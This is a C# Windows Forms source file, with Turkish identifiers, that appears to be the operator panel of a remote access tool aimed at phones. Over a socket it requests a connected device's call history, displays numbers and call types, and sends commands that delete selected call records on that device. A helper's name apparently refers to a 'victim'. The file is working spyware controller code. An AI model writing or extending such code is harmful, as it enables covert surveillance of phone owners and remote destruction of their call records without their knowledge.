using System;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Text;

namespace SV
{
    public partial class CagriKayitlari : MetroFramework.Forms.MetroForm
    {
        Socket sock;
        public string ID = "";
        public CagriKayitlari(Socket sck, string aydi)
        {
            InitializeComponent();
            lArray = new List<ListViewItem>();
            sock = sck; ID = aydi;
        }
        List<ListViewItem> lArray = default;
        public void bilgileriIsle(string arg)
        {
            lArray.Clear();
            listView1.Items.Clear();
            if (arg != "CAGRI YOK")
            {
                string[] ana_Veriler = arg.Split('&');
                for (int k = 0; k < ana_Veriler.Length; k++)
                {
                    try
                    {
                        string[] bilgiler = ana_Veriler[k].Split('=');
                        ListViewItem item = new ListViewItem(bilgiler[0].Replace("Kayıtsız numara", "Unregistered number"));
                        item.SubItems.Add(bilgiler[1]);
                        item.SubItems.Add(bilgiler[2]);
                        item.SubItems.Add(bilgiler[3]);
                        item.SubItems.Add(bilgiler[4]);
                        switch (bilgiler[4])
                        {
                            case "Incoming":
                                item.ImageIndex = 1;
                                break;
                            case "Outgoing":
                                item.ImageIndex = 3;
                                break;
                            case "Missed":
                                item.ImageIndex = 2;
                                break;
                            case "Rejected":
                                item.ImageIndex = 0;
                                break;
                            case "Black List":
                                item.ImageIndex = 0;
                                break;
                        }
                        //listView1.Items.Add(item);
                        lArray.Add(item);
                    }
                    catch (Exception) { }
                }
                listView1.Items.AddRange(lArray.ToArray());
            }
            else
            {
                ListViewItem item = new ListViewItem("There is no Call");
                listView1.Items.Add(item);
            }
        }      
        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("CALLLOGS", Encoding.UTF8.GetBytes("ECHO"));
                sock.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("DELETECALL", Encoding.UTF8.GetBytes(listView1.SelectedItems[0].SubItems[1].Text));
                    sock.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                    Text = "Call Logs - " + ((Form1)Application.OpenForms["Form1"]).krbnIsminiBul(sock.Handle.ToString());
                    listView1.SelectedItems[0].Remove();
                }
                catch (Exception) { }
            }
        }

        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                Clipboard.SetText(listView1.SelectedItems[0].SubItems[1].Text);
            }
        }
    }
}
